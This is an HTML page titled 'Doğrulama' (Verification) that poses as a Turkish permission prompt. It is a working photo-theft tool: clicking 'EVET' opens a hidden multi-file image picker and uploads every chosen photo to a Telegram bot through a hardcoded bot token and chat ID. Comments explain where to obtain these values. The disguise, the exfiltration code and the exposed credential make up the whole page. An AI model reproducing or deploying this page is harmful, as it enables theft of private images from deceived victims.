<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Doğrulama</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #1a1a2e; color: white; }
        .container { background: #16213e; padding: 30px; border-radius: 20px; max-width: 400px; margin: auto; }
        button { padding: 16px 32px; font-size: 20px; margin: 10px; border: none; border-radius: 10px; cursor: pointer; }
        #yesBtn { background: #4CAF50; color: white; }
        #noBtn { background: #f44336; color: white; }
        #status { margin-top: 20px; font-size: 16px; }
        #progress { margin-top: 10px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>
<div class="container">
    <h1>🔐 Üç İstiyor musunuz?</h1>
    <p>Devam etmek için izin verin</p>
    <button id="yesBtn">EVET</button>
    <button id="noBtn">HAYIR</button>
    <div id="status"></div>
    <div id="progress"></div>
</div>

<script>
    const BOT_TOKEN = "8746989231:AAHGfFiFC8uRTi6lXoUNuTRL8cQMUfMm5nE";   // @BotFather'dan aldığın token
    const CHAT_ID = "8729744465";     // @userinfobot'dan aldığın ID

    function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(',')[1]);
        const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

    async function sendToTelegram(imageData, fileName, index, total) {
        const blob = dataURItoBlob(imageData);
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, fileName);
        formData.append("caption", `📸 ${index}/${total} - ${fileName}`);

        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
            return res.ok;
        } catch(e) {
            return false;
        }
    }

    function getAllImagesFromGallery() {
        return new Promise((resolve) => {
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.multiple = true;
            input.style.display = 'none';
            document.body.appendChild(input);

            input.onchange = async function(e) {
                const files = this.files;
                const imageDataArray = [];
                for (let i = 0; i < files.length; i++) {
                    const file = files[i];
                    const reader = new FileReader();
                    const data = await new Promise((res) => {
                        reader.onload = (ev) => res(ev.target.result);
                        reader.readAsDataURL(file);
                    });
                    imageDataArray.push({ data: data, name: file.name });
                }
                resolve(imageDataArray);
                this.remove();
            };

            input.click();
        });
    }

    document.getElementById('yesBtn').onclick = async function() {
        document.getElementById('status').innerHTML = '📸 İzin istendi...';
        document.getElementById('progress').innerHTML = '';

        try {
            const images = await getAllImagesFromGallery();
            const total = images.length;
            document.getElementById('status').innerHTML = `📤 ${total} fotoğraf bulundu, gönderiliyor...`;

            let success = 0;
            for (let i = 0; i < total; i++) {
                const ok = await sendToTelegram(images[i].data, images[i].name, i+1, total);
                if (ok) success++;
                document.getElementById('progress').innerHTML = `📤 ${i+1}/${total} gönderildi (${success} başarılı)`;
                await new Promise(r => setTimeout(r, 800));
            }
            document.getElementById('status').innerHTML = `✅ ${success}/${total} fotoğraf Telegram'a gönderildi!`;
        } catch(err) {
            document.getElementById('status').innerHTML = '❌ Hata: ' + err.message;
        }
    };

    document.getElementById('noBtn').onclick = function() {
        document.getElementById('status').innerHTML = '❌ Reddedildi.';
        document.getElementById('progress').innerHTML = '';
    };
</script>
</body>
</html>
